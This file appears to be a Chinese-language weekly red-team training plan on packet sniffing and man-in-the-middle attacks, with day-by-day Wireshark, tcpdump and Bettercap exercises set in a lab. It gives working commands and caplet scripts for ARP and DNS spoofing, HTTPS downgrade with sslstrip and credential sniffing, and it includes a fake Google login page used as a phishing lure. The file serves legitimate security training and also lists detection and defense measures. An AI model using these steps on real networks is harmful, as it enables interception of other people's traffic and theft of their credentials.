@@ -1,0 +1,622 @@
+================================================================================
+第20周：网络嗅探与MITM (网络攻击期)
+================================================================================
+
+【本周围绕的核心渗透案例阶段】
+以"在网络层捕获和分析敏感数据"为贯穿案例，学员深入学习Wireshark网络协议
+分析、tcpdump命令行抓包、Bettercap中间人(MITM)攻击框架，以及ARP欺骗和
+DNS欺骗的完整攻击链。最终在实验网络环境中实现完整的MITM攻击并成功捕获
+目标主机的明文凭证。本阶段属于"网络攻击期"，是红队内网渗透和横向移动
+的重要能力。
+
+【本周学习目标】
+1. 掌握Wireshark深度使用：过滤语法、协议分析、会话重建、数据提取
+2. 熟练使用tcpdump命令行抓包：过滤器语法、文件管理、实时分析
+3. 掌握Bettercap框架架构和核心功能模块
+4. 理解ARP协议的漏洞：ARP欺骗(ARP Spoofing/Poisoning)原理
+5. 理解DNS协议的漏洞：DNS欺骗(DNS Spoofing)、DNS投毒
+6. 掌握Bettercap的MITM攻击全流程：ARP欺骗、DNS欺骗、HTTP/HTTPS嗅探
+7. 能够使用Bettercap在实验网络中捕获HTTP明文凭证
+8. 理解SSL/TLS中间人攻击(HSTS绕过、sslstrip)原理
+9. 掌握网络层攻击的检测方法和防御方案
+10. 在实验环境中完成完整的MITM攻击链：ARP欺骗 -> 流量重定向 -> 凭证捕获
+
+【本周知识清单】
+★ Wireshark深度分析
+  - Wireshark核心功能：实时抓包、离线分析、协议解析、会话重建
+  - 显示过滤器(Display Filter)语法：
+    * 协议过滤：tcp, udp, http, dns, arp, icmp
+    * IP过滤：ip.addr==192.168.1.1, ip.src==, ip.dst==
+    * 端口过滤：tcp.port==80, tcp.dstport==443, udp.port==53
+    * HTTP过滤：http.request.method=="GET", http.response.code==200
+    * 内容过滤：http contains "password", frame contains "admin"
+    * 组合过滤：http && ip.src==192.168.1.1 && tcp.port==80
+    * 过滤包含字符串：http.request.uri contains "login"
+  - 捕获过滤器(Capture Filter)：
+    * BPF语法(Berkeley Packet Filter)
+    * host 192.168.1.1
+    * tcp port 80
+    * not arp (排除ARP流量)
+    * src host 192.168.1.1 and dst port 443
+  - 会话重建：Follow TCP Stream / Follow HTTP Stream
+  - 数据导出：导出HTTP对象(File -> Export Objects -> HTTP)
+  - 协议层级统计：Statistics -> Protocol Hierarchy
+  - 端点统计：Statistics -> Endpoints
+  - 会话统计：Statistics -> Conversations
+
+★ tcpdump命令行抓包
+  - tcpdump概述：Unix/Linux下最强大的命令行抓包工具
+  - 核心参数：
+    * -i：指定网络接口 (eth0, wlan0, lo, any)
+    * -n：不进行DNS解析（显示IP而非主机名）
+    * -nn：不进行DNS和端口名解析
+    * -v/-vv/-vvv：详细输出级别
+    * -w file.pcap：写入pcap文件（供Wireshark分析）
+    * -r file.pcap：读取pcap文件
+    * -c N：捕获N个包后停止
+    * -s 0：抓取完整数据包（默认68字节可能截断）
+    * -A：以ASCII显示包内容
+    * -X：以Hex+ASCII显示包内容
+    * -l：行缓冲（用于管道处理）
+  - tcpdump过滤器(BPF)语法：
+    * host 192.168.1.1
+    * net 192.168.1.0/24
+    * port 80 or port 443
+    * not arp (排除ARP)
+    * src host 192.168.1.1
+    * dst port 22
+    * tcp[13] & 2 != 0 (只抓SYN包)
+    * less 128 (只抓小于128字节的包)
+    * 组合：tcpdump -i eth0 host 192.168.1.1 and port 80
+
+★ Bettercap MITM攻击
+  - Bettercap概述：现代、模块化的MITM攻击框架
+  - 核心模块(Caplets)：
+    * net.probe：网络探测（ARP/DNS/mDNS/NBNS扫描）
+    * net.sniff：数据包嗅探和凭证提取
+    * net.recon：被动和主动网络发现
+    * arp.spoof：ARP欺骗（MITM核心）
+    * dns.spoof：DNS欺骗
+    * http.proxy：HTTP/HTTPS代理
+    * https.proxy：HTTPS透明代理（降级攻击）
+    * net.fuzz：网络协议模糊测试
+    * wifi.*：Wi-Fi相关攻击模块
+  - Bettercap会话管理：
+    * 交互式CLI：类似Metasploit的模块化操作
+    * Caplet脚本：自动化工作流
+    * Web UI：图形化界面(http://127.0.0.1:80)
+  - ARP欺骗(ARP Spoofing)原理：
+    * ARP协议是无状态、无认证的
+    * 攻击者发送伪造ARP应答
+    * 毒化受害者ARP缓存表
+    * 将网关IP映射到攻击者MAC -> 受害者流量经过攻击者
+  - DNS欺骗(DNS Spoofing)原理：
+    * 攻击者在ARP MITM基础上
+    * 拦截DNS查询请求
+    * 返回伪造DNS应答
+    * 将目标域名解析到攻击者控制的IP
+
+★ MITM综合攻击链
+  - 完整MITM攻击流程：
+    1. 网络发现(tcpdump/bettercap探测)
+    2. ARP欺骗（将攻击者设为中间人）
+    3. 启用IP转发（保证受害者网络不断开）
+    4. 启动流量嗅探（捕获明文凭证）
+    5. HTTP/HTTPS降级攻击（sslstrip绕过HTTPS）
+    6. DNS欺骗（重定向到钓鱼页面）
+    7. 凭证捕获和会话劫持
+  - SSL/TLS降级攻击：
+    * sslstrip：将HTTPS链接替换为HTTP
+    * 利用用户输错URL或HSTS预加载列表的缺失
+    * Bettercap内置http.proxy和https.proxy模块
+  - MITM攻击的权限要求：
+    * 需要root权限（原始套接字和ARP操作）
+    * 通常在已经获得内网访问权限后使用
+    * 用于横向移动和信息收集
+
+【本周工具清单】
+  - Wireshark (图形化协议分析)
+  - tcpdump (命令行抓包)
+  - Bettercap (MITM攻击框架)
+  - sslstrip (HTTPS降级)
+  - Metasploitable2 (内网靶机)
+  - curl / wget (HTTP测试)
+
+================================================================================
+周一：Wireshark深度分析
+================================================================================
+
+📚 第1小时 | 理论学习 (08:00 - 09:00)
+  学习内容：Wireshark界面、显示过滤器语法、协议分析基础
+  - Wireshark工作流程：
+    * 选择网络接口 -> 开始捕获 -> 应用过滤器 -> 分析数据包 -> 导出结果
+  - 三层视图：
+    * 包列表(Packet List)：所有捕获的包，按时间排列
+    * 包详情(Packet Details)：选中包的各层协议解析（树形结构）
+    * 包字节(Packet Bytes)：原始十六进制+ASCII数据
+  - OSI七层模型在Wireshark中的体现：
+    * 物理层：不直接可见
+    * 数据链路层：以太网帧(MAC地址)
+    * 网络层：IP包(源/目标IP)
+    * 传输层：TCP/UDP段(源/目标端口)
+    * 会话层：TCP三次握手(SYN->SYN-ACK->ACK)
+    * 表示层：TLS/SSL握手
+    * 应用层：HTTP/FTP/DNS/SMB协议数据
+  - 显示过滤器(Display Filters)深度：
+    * 逻辑运算：and(&&), or(||), not(!)
+    * 比较运算：==, !=, >, <, >=, <=
+    * 包含运算：contains, matches(正则)
+    * 帧元数据：frame.number, frame.time, frame.len
+    * 以太网：eth.src, eth.dst, eth.type
+    * IP：ip.src, ip.dst, ip.addr, ip.proto, ip.ttl
+    * TCP：tcp.srcport, tcp.dstport, tcp.flags.syn, tcp.flags.ack
+    * HTTP：http.host, http.request.uri, http.user_agent, http.cookie
+    * DNS：dns.qry.name, dns.resp.name
+  - 统计功能：
+    * Statistics -> Summary：捕获统计概要
+    * Statistics -> Protocol Hierarchy：协议层级分布
+    * Statistics -> Conversations：通信会话统计
+    * Statistics -> HTTP -> Requests：HTTP请求列表
+  参考文件：/home/a/成长为一个红队/archstrike-base教学/06-网络嗅探与中间人攻击.txt
+
+💻 第2小时 | 动手实践 (09:00 - 10:00)
+  练习内容：使用Wireshark捕获和分析本地网络流量
+  参考文件：/home/a/成长为一个红队/archstrike-base教学/06-网络嗅探与中间人攻击.txt
+
+  操作步骤：
+    Step 1: sudo wireshark 启动Wireshark（需要root权限才能抓包）
+    Step 2: 选择网络接口（eth0或ens33等），双击开始抓包
+    Step 3: 打开浏览器，访问 http://192.168.56.101/dvwa
+    Step 4: 在DVWA中登录（admin/password），浏览几个页面
+    Step 5: 停止抓包（红色方块按钮）
+    Step 6: 使用显示过滤器过滤HTTP流量: http
+    Step 7: 分析HTTP请求/响应:
+      - 找到登录请求(POST /dvwa/login.php)
+      - 查看请求中的username和password参数
+      - 右键 -> Follow -> HTTP Stream 查看完整HTTP会话
+    Step 8: 过滤特定IP的流量: ip.addr==192.168.56.101
+    Step 9: 过滤GET请求: http.request.method=="GET"
+    Step 10: 过滤POST请求: http.request.method=="POST"
+    Step 11: 过滤包含密码的包: http contains "password"
+    Step 12: 过滤包含cookie的包: http.cookie
+    Step 13: 查看TCP三次握手:
+      过滤: ip.addr==192.168.56.101 and tcp
+      观察SYN -> SYN-ACK -> ACK序列
+    Step 14: 查看DNS查询:
+      过滤: dns
+      访问一个新网站触发DNS查询
+      查看DNS查询和应答的域名和IP
+    Step 15: 使用Statistics -> Protocol Hierarchy 查看流量协议分布
+    Step 16: 使用Statistics -> HTTP -> Requests 查看所有HTTP请求
+    Step 17: 导出HTTP对象: File -> Export Objects -> HTTP
+    Step 18: 保存捕获文件: File -> Save As -> capture.pcapng
+    Step 19: 使用tcpdump生成pcap文件供Wireshark分析:
+      sudo tcpdump -i eth0 -w /tmp/tcpdump_capture.pcap host 192.168.56.101
+
+📝 第3小时 | 复盘总结 (10:00 - 11:00)
+  - 今日收获：
+  - 遇到问题：
+  - 明日计划：
+
+================================================================================
+周二：tcpdump命令行抓包
+================================================================================
+
+📚 第1小时 | 理论学习 (08:00 - 09:00)
+  学习内容：tcpdump BPF过滤器语法、高级选项和自动化抓包
+  - tcpdump在渗透测试中的应用场景：
+    * 远程服务器上抓包（无GUI环境）
+    * 编写抓包脚本自动化
+    * 配合管道实时分析
+    * 生成pcap文件供Wireshark离线分析
+  - BPF过滤器语法详解：
+    * 主机过滤：host, src host, dst host
+    * 网络过滤：net, src net, dst net
+    * 端口过滤：port, src port, dst port, portrange
+    * 协议过滤：tcp, udp, icmp, arp, ip, ip6
+    * 包大小：less, greater
+    * 逻辑运算：and(&&), or(||), not(!)
+    * 优先级：括号分组 ()
+  - 高级过滤表达式：
+    * tcp[tcpflags] & (tcp-syn|tcp-fin) != 0
+    * tcp[13] = 0x02 (仅SYN)
+    * udp[8:2] > 100 (UDP payload长度)
+    * ether[0:4] & 0xffffffff = 0xffffffff (广播帧)
+    * vlan (VLAN tagged frames)
+  - tcpdump输出格式：
+    * 时间戳：默认时间格式, -tttt可读格式
+    * IP数据：src > dst: flags
+    * TCP数据：seq, ack, win, options
+    * 应用层数据：使用-A或-X查看
+  - 实用命令组合：
+    * 实时凭证嗅探：tcpdump -i eth0 -A -l port http | grep -i "password\|username\|login"
+    * DNS查询监控：tcpdump -i eth0 -n port 53
+    * 监控特定主机：tcpdump -i eth0 host 192.168.1.100
+    * 排除SSH流量（避免看到自己的管理流量）：tcpdump -i eth0 not port 22
+  参考文件：/home/a/成长为一个红队/archstrike-base教学/06-网络嗅探与中间人攻击.txt
+
+💻 第2小时 | 动手实践 (09:00 - 10:00)
+  练习内容：tcpdump命令行抓包实战，各种过滤器和输出格式
+  参考文件：/home/a/成长为一个红队/archstrike-base教学/06-网络嗅探与中间人攻击.txt
+
+  操作步骤：
+    Step 1: sudo tcpdump -D 列出所有可用网络接口
+    Step 2: tcpdump --help 查看帮助信息
+    Step 3: 基础抓包: sudo tcpdump -i eth0 -c 20 抓取20个包
+    Step 4: 抓包并显示详细信息: sudo tcpdump -i eth0 -v -c 10
+    Step 5: 抓包不解析DNS: sudo tcpdump -i eth0 -n -c 10
+    Step 6: 抓包写入文件: sudo tcpdump -i eth0 -w /tmp/test_capture.pcap -c 100
+    Step 7: 读取pcap文件: tcpdump -r /tmp/test_capture.pcap
+    Step 8: 读取pcap并过滤: tcpdump -r /tmp/test_capture.pcap http
+    Step 9: 过滤特定主机: sudo tcpdump -i eth0 host 192.168.56.101
+    Step 10: 过滤特定端口: sudo tcpdump -i eth0 port 80
+    Step 11: 组合过滤: sudo tcpdump -i eth0 host 192.168.56.101 and port 80
+    Step 12: 排除ARP: sudo tcpdump -i eth0 not arp
+    Step 13: 过滤HTTP流量并以ASCII显示内容:
+      sudo tcpdump -i eth0 -A -s 0 'tcp port 80'
+    Step 14: 实时提取HTTP凭证:
+      sudo tcpdump -i eth0 -A -s 0 'tcp port 80' | grep -E "username|password|passwd|login" --line-buffered
+    Step 15: 后台抓包: sudo tcpdump -i eth0 -w /tmp/background_cap.pcap &
+    Step 16: 在后台抓包的同时访问DVWA，触发HTTP流量
+    Step 17: 停止抓包: sudo pkill tcpdump
+    Step 18: 用Wireshark打开/tmp/background_cap.pcap进行分析
+    Step 19: 使用tcpdump查看pcap中的HTTP请求:
+      tcpdump -r /tmp/background_cap.pcap -A 'tcp port 80' | grep -E "GET|POST" | head -20
+    Step 20: tcpdump抓DNS流量: sudo tcpdump -i eth0 -n port 53 -c 20
+    Step 21: tcpdump抓ICMP(ping): sudo tcpdump -i eth0 icmp -c 10
+
+📝 第3小时 | 复盘总结 (10:00 - 11:00)
+  - 今日收获：
+  - 遇到问题：
+  - 明日计划：
+
+================================================================================
+周三：Bettercap MITM攻击
+================================================================================
+
+📚 第1小时 | 理论学习 (08:00 - 09:00)
+  学习内容：Bettercap框架架构和核心攻击模块
+  - Bettercap vs Ettercap：
+    * Bettercap是Ettercap的现代替代品
+    * 支持IPv6、HTTP/2、模块化架构
+    * 内置HTTP/HTTPS代理、REST API、Web UI
+  - Bettercap工作模式：
+    * 交互式CLI（类似msfconsole）
+    * Caplet脚本（自动化攻击流程）
+    * Web UI（浏览器图形界面）
+  - 核心模块深度解析：
+    * net.probe：发送探测包发现网络中主机
+      - 支持ARP探测、mDNS探测、NBNS探测、UPnP探测
+    * net.recon：被动/主动网络发现
+      - 被动监听ARP/DHCP流量发现主机
+      - 主动探测结合设备指纹识别
+    * arp.spoof：ARP欺骗模块
+      - arp.spoof on 启动ARP欺骗
+      - 参数：arp.spoof.targets (目标IP)
+      - arp.spoof.whitelist (排除IP)
+      - 默认欺骗整个子网
+    * dns.spoof：DNS欺骗模块
+      - dns.spoof on 启动DNS欺骗
+      - dns.spoof.domains (目标域名列表)
+      - dns.spoof.address (重定向IP)
+      - dns.spoof.all (拦截所有DNS查询)
+    * net.sniff：流量嗅探模块
+      - net.sniff on 启动嗅探
+      - 自动提取HTTP凭证、Cookie、表单数据
+      - net.sniff.output (输出文件)
+      - net.sniff.filter (BPF过滤器)
+    * http.proxy / https.proxy：HTTP/HTTPS代理模块
+      - http.proxy on 启动HTTP透明代理
+      - 自动注入JS代码（hook/info收集）
+      - https.proxy on 启动HTTPS代理（需要生成CA证书）
+  - Bettercap启动选项：
+    * bettercap -iface eth0 指定接口
+    * bettercap -eval "命令" 启动时执行命令
+    * bettercap -caplet script.cap 运行脚本
+  参考文件：/home/a/成长为一个红队/archstrike-base教学/06-网络嗅探与中间人攻击.txt
+
+💻 第2小时 | 动手实践 (09:00 - 10:00)
+  练习内容：安装Bettercap，基本网络发现和模块操作
+  参考文件：/home/a/成长为一个红队/archstrike-base教学/06-网络嗅探与中间人攻击.txt
+
+  操作步骤：
+    Step 1: sudo apt install bettercap 安装Bettercap
+    Step 2: sudo bettercap -h 查看帮助
+    Step 3: sudo bettercap -iface eth0 启动Bettercap CLI
+    Step 4: help 查看可用命令列表
+    Step 5: help net.probe 查看net.probe模块帮助
+    Step 6: help net.recon 查看net.recon模块帮助
+    Step 7: 启动网络侦察:
+      net.recon on
+      观察发现的网络设备（IP、MAC、主机名、厂商）
+    Step 8: net.show 查看已发现设备列表
+    Step 9: 主动探测(如果被动发现不足):
+      net.probe on
+      net.show 更新后的设备列表
+    Step 10: 查看ARP欺骗模块帮助:
+      help arp.spoof
+    Step 11: 启动HTTP代理检测:
+      http.proxy on
+    Step 12: 设置net.sniff:
+      set net.sniff.filter "tcp port 80 or tcp port 443"
+      net.sniff on
+    Step 13: 在另一个终端访问HTTP网站触发生成流量
+    Step 14: 观察Bettercap中捕获的HTTP请求信息
+    Step 15: 查看net.sniff捕获结果:
+      events.show (查看捕获的HTTP凭证事件)
+    Step 16: 使用Web UI:
+      打开浏览器访问 https://127.0.0.1 (Bettercap Web UI)
+      登录查看图形化界面
+    Step 17: 创建自定义caplet脚本 test.cap:
+      echo 'net.recon on' > test.cap
+      echo 'net.probe on' >> test.cap
+      echo 'net.show' >> test.cap
+      echo 'http.proxy on' >> test.cap
+      echo 'net.sniff on' >> test.cap
+    Step 18: 运行caplet: sudo bettercap -iface eth0 -caplet test.cap
+    Step 19: 了解Bettercap事件系统: events.show
+
+📝 第3小时 | 复盘总结 (10:00 - 11:00)
+  - 今日收获：
+  - 遇到问题：
+  - 明日计划：
+
+================================================================================
+周四：ARP欺骗 + DNS欺骗
+================================================================================
+
+📚 第1小时 | 理论学习 (08:00 - 09:00)
+  学习内容：ARP欺骗和DNS欺骗的完整攻击原理
+  - ARP协议漏洞：
+    * ARP是无状态协议：不验证应答是否对应请求
+    * ARP是无认证协议：任何设备可以发送ARP应答
+    * ARP缓存会被动态更新：最新的ARP应答覆盖旧的缓存
+    * 这些设计缺陷导致了ARP欺骗攻击的可能性
+  - ARP欺骗攻击详解：
+    * 攻击者向受害者发送伪造ARP应答
+    * "我是网关(IP:192.168.1.1)，我的MAC是XX:XX:XX:XX:XX:XX"
+    * 受害者更新ARP缓存：192.168.1.1 -> 攻击者MAC
+    * 受害者发送给网关的数据包实际上发送给了攻击者
+    * 攻击者查看/修改数据后再转发给真正的网关
+  - 双向ARP欺骗（Full-Duplex）：
+    * 同时欺骗受害者和网关
+    * 对受害者：网关IP -> 攻击者MAC
+    * 对网关：受害者IP -> 攻击者MAC
+    * 实现完整的中间人（双向流量都经过攻击者）
+  - IP转发(IP Forwarding)：
+    * 攻击者必须启用IP转发才能维持网络连接
+    * Linux: echo 1 > /proc/sys/net/ipv4/ip_forward
+    * 否则受害者会断网，发现异常
+  - DNS欺骗：
+    * 在ARP MITM基础上拦截DNS查询
+    * 攻击者伪造DNS应答返回虚假IP
+    * 将受害者引导到攻击者控制的钓鱼服务器
+    * 应用场景：
+      - 将银行域名重定向到钓鱼页面
+      - 将软件更新链接重定向到恶意安装包
+      - 拦截社交媒体流量进行凭证收集
+  - DNS欺骗与HTTP代理的结合：
+    * DNS欺骗 -> 将目标域名解析到攻击者IP
+    * HTTP代理 -> 在攻击者IP上运行Web服务器
+    * 显示伪造的登录页面 -> 收集凭证
+  参考文件：/home/a/成长为一个红队/archstrike-base教学/06-网络嗅探与中间人攻击.txt
+
+💻 第2小时 | 动手实践 (09:00 - 10:00)
+  练习内容：完整的ARP欺骗+IP转发+DNS欺骗攻击链
+  参考文件：/home/a/成长为一个红队/archstrike-base教学/06-网络嗅探与中间人攻击.txt
+
+  操作步骤：
+    Step 1: 确认实验网络拓扑:
+      攻击者IP: 192.168.56.1
+      受害者(Metasploitable2): 192.168.56.101
+      网关: 192.168.56.1 (或宿主机网关)
+    Step 2: 启用IP转发:
+      sudo sysctl -w net.ipv4.ip_forward=1
+      sudo echo 1 > /proc/sys/net/ipv4/ip_forward
+    Step 3: 确认IP转发已启用: cat /proc/sys/net/ipv4/ip_forward
+    Step 4: sudo bettercap -iface eth0 启动Bettercap
+    Step 5: 网络发现:
+      net.recon on
+      net.probe on
+      net.show
+    Step 6: 设置ARP欺骗参数:
+      set arp.spoof.targets 192.168.56.101 (指定受害者IP)
+      set arp.spoof.internal true (同时欺骗网关)
+    Step 7: 启动ARP欺骗:
+      arp.spoof on
+    Step 8: 验证ARP欺骗是否成功:
+      在Metasploitable2上: arp -a
+      观察网关IP对应的MAC地址是否变为攻击者MAC
+    Step 9: 启动网络嗅探:
+      set net.sniff.filter tcp
+      net.sniff on
+    Step 10: 启动HTTP代理:
+      http.proxy on
+    Step 11: 在Metasploitable2上访问HTTP网站:
+      curl http://example.com
+      curl http://httpbin.org/post -d "user=admin&pass=secret"
+    Step 12: 在Bettercap中观察捕获的HTTP请求:
+      events.show
+      寻找HTTP POST中的用户名密码
+    Step 13: 启动DNS欺骗:
+      set dns.spoof.all true (拦截所有DNS查询)
+      set dns.spoof.address 192.168.56.1 (重定向到攻击者IP)
+      dns.spoof on
+    Step 14: 在Metasploitable2上触发DNS查询:
+      nslookup www.google.com
+      ping www.facebook.com
+      观察DNS应答是否为攻击者IP
+    Step 15: 配置DNS欺骗+特定域名重定向:
+      set dns.spoof.all false
+      set dns.spoof.domains www.google.com, *.google.com, gmail.com
+      set dns.spoof.address 192.168.56.1
+      dns.spoof on
+    Step 16: 在攻击机上启动简单的钓鱼Web服务器:
+      cd /tmp && echo "<h1>Google Login</h1><form>Username: <input name='user'><br>Password: <input name='pass' type='password'><br><input type='submit'></form>" > index.html
+      sudo python3 -m http.server 80
+    Step 17: Metasploitable2上访问: curl http://www.google.com
+      观察是否被重定向到攻击者的钓鱼页面
+
+📝 第3小时 | 复盘总结 (10:00 - 11:00)
+  - 今日收获：
+  - 遇到问题：
+  - 明日计划：
+
+================================================================================
+周五：MITM综合实战 (在实验网络中捕获凭证)
+================================================================================
+
+📚 第1小时 | 理论学习 (08:00 - 09:00)
+  学习内容：MITM攻击完整链串联、实战注意事项和防御检测
+  - 完整MITM攻击链回顾：
+    1. 网络扫描(net.recon/probe) -> 发现目标主机
+    2. ARP欺骗(arp.spoof) -> 将自己置于通信中间
+    3. IP转发(sysctl) -> 保证目标网络通信不断
+    4. 流量嗅探(net.sniff) -> 捕获明文数据/凭证
+    5. HTTP代理(http.proxy) -> 注入或监控Web流量
+    6. DNS欺骗(dns.spoof) -> 重定向特定域名
+    7. SSL降级(https.proxy/sslstrip) -> 绕过HTTPS
+    8. 凭证收集 -> 后续利用
+  - 实战注意事项：
+    * 实验网络隔离：只在授权测试环境中进行！
+    * IP转发必须开启：否则受害者断网，触发警报
+    * 避免网络风暴：ARP包发送频率设置合理
+    * 排除管理流量：不要MITM自己的SSH连接
+    * 法律和伦理：仅用于授权渗透测试
+  - MITM攻击检测：
+    * ARP监控：arpwatch, XArp, Snort ARP spoofing规则
+    * MAC地址变化：突然的MAC地址变更
+    * 网络延迟增加：流量中转增加了延迟
+    * SSL证书警告：HTTPS降级攻击可能触发证书错误
+  - 防御措施：
+    * 静态ARP表项（重要服务器）
+    * 802.1X端口认证
+    * DHCP Snooping + Dynamic ARP Inspection
+    * VLAN隔离
+    * HSTS预加载（防止SSL降级）
+    * DNSSEC（防止DNS欺骗）
+    * 网络分段和微分段
+
+💻 第2小时 | 动手实践 (09:00 - 10:00)
+  练习内容：完整MITM攻击链综合实战，捕获HTTP明文凭证
+  操作步骤：
+    Step 1: 确认实验环境:
+      攻击者: 192.168.56.1
+      Metasploitable2: 192.168.56.101
+    Step 2: 启用IP转发:
+      sudo sysctl -w net.ipv4.ip_forward=1
+      sudo echo 1 > /proc/sys/net/ipv4/ip_forward
+    Step 3: 创建完整MITM的caplet脚本 full_mitm.cap:
+      echo 'net.recon on' > full_mitm.cap
+      echo 'net.probe on' >> full_mitm.cap
+      echo 'set arp.spoof.targets 192.168.56.101' >> full_mitm.cap
+      echo 'set arp.spoof.internal true' >> full_mitm.cap
+      echo 'arp.spoof on' >> full_mitm.cap
+      echo 'set net.sniff.filter tcp' >> full_mitm.cap
+      echo 'set net.sniff.local true' >> full_mitm.cap
+      echo 'net.sniff on' >> full_mitm.cap
+      echo 'http.proxy on' >> full_mitm.cap
+      echo 'set dns.spoof.all true' >> full_mitm.cap
+      echo 'set dns.spoof.address 192.168.56.1' >> full_mitm.cap
+      echo 'dns.spoof on' >> full_mitm.cap
+    Step 4: sudo bettercap -iface eth0 -caplet full_mitm.cap 启动完整MITM攻击
+    Step 5: 在Metasploitable2上触发HTTP流量:
+      ssh msfadmin@192.168.56.101
+      curl -X POST http://httpbin.org/post -d "username=admin&password=secret123"
+      curl -X POST http://testphp.vulnweb.com/userinfo.php -d "uname=test&pass=test123"
+    Step 6: 在Bettercap CLI中查看捕获的HTTP凭证:
+      events.show
+      搜索POST数据中的username/password
+    Step 7: 启动sslstrip进行HTTPS降级:
+      新开终端: sudo sslstrip -l 8080
+      或使用Bettercap内置HTTPS代理:
+        https.proxy on
+        set https.proxy.sslstrip true
+    Step 8: 观察HTTP/HTTPS流量捕获结果
+    Step 9: 使用tcpdump同时抓包验证:
+      sudo tcpdump -i eth0 -w /tmp/mitm_verify.pcap host 192.168.56.101
+    Step 10: 在Metasploitable2上访问DVWA:
+      curl http://192.168.56.1/dvwa/ (如果攻击机有DVWA)
+      或访问Metasploitable2自身的HTTP服务: curl http://192.168.56.101/dvwa/login.php
+    Step 11: 在Bettercap中查看捕获的HTTP Cookie和表单数据
+    Step 12: 提取Bettercap捕获的敏感数据:
+      记录发现的用户名、密码、Cookie、Token等
+    Step 13: 整理完整攻击链报告:
+      - 攻击开始时间
+      - 目标IP和MAC
+      - 使用的攻击模块
+      - 成功捕获的凭证列表
+      - 攻击持续时间
+    Step 14: 关闭所有攻击模块:
+      arp.spoof off
+      net.sniff off
+      http.proxy off
+      dns.spoof off
+      net.probe off
+      exit
+
+📝 第3小时 | 复盘总结 (10:00 - 11:00)
+  - 今日收获：
+  - 遇到问题：
+  - 明日计划：
+
+================================================================================
+周六：复习日 (2h 复习 + 1h HTB/THM)
+================================================================================
+
+📝 第1小时 | 周知识点回顾 (08:00 - 09:00)
+  复习清单：
+  - Wireshark显示过滤器TOP 20：ip.addr, tcp.port, http.request.method, dns等
+  - tcpdump BPF过滤器：host, port, net, src, dst, and/or/not组合
+  - Bettercap核心模块：net.recon, arp.spoof, net.sniff, http.proxy, dns.spoof
+  - ARP欺骗原理：ARP协议无认证 -> 伪造ARP应答 -> 毒化ARP缓存
+  - DNS欺骗原理：ARP MITM基础上拦截DNS查询 -> 返回虚假IP
+  - MITM攻击链：发现 -> 欺骗 -> 转发 -> 嗅探 -> 代理 -> 欺骗 -> 收集
+
+💻 第2小时 | 综合实战复习 (09:00 - 10:00)
+  练习内容：不参考笔记，独立完成一次完整MITM攻击
+  操作步骤：
+    Step 1: 配置实验网络环境
+    Step 2: 使用Bettercap完成ARP欺骗 + DNS欺骗 + 流量嗅探
+    Step 3: 使用tcpdump同时抓包
+    Step 4: 在受害机上触发HTTP流量
+    Step 5: 验证成功捕获凭证
+    Step 6: 使用Wireshark分析捕获的pcap文件
+
+🔓 第3小时 | HackTheBox / TryHackMe 网络攻击 (10:00 - 11:00)
+  练习内容：在在线平台上练习网络嗅探和分析技能
+  操作步骤：
+    Step 1: 在THM中搜索"Wireshark"或"Network"相关房间
+    Step 2: 练习Wireshark分析挑战（CTF式pcap分析）
+    Step 3: 使用tcpdump命令行分析工具
+    Step 4: 提取pcap文件中的flag
+    Step 5: 记录网络分析的关键技巧
+
+================================================================================
+周日：休息日
+================================================================================
+
+【本周资源清单】
+理论知识文件：
+  /home/a/成长为一个红队/archstrike-base教学/06-网络嗅探与中间人攻击.txt
+
+实践教程文件：
+  /home/a/成长为一个红队/archstrike-base教学/06-网络嗅探与中间人攻击.txt
+
+在线练习：
+  - Metasploitable2作为MITM受害者 (192.168.56.101)
+  - HackTheBox网络挑战 (https://app.hackthebox.com)
+  - TryHackMe Wireshark房间 (https://tryhackme.com)
+  - Wireshark官方示例pcap (https://wiki.wireshark.org/SampleCaptures)
+  - PacketLife.net pcap库 (https://packetlife.net/captures/)
+
+推荐工具安装：
+  - Wireshark (sudo apt install wireshark)
+  - tcpdump (sudo apt install tcpdump)
+  - Bettercap (sudo apt install bettercap)
+  - sslstrip (sudo apt install sslstrip)
+  - tshark (sudo apt install tshark) - Wireshark命令行版本
+
+【本周完成检查】
+[ ] 周一 [ ] 周二 [ ] 周三 [ ] 周四 [ ] 周五
+[ ] 周六复习 [ ] 笔记 [ ] 体能
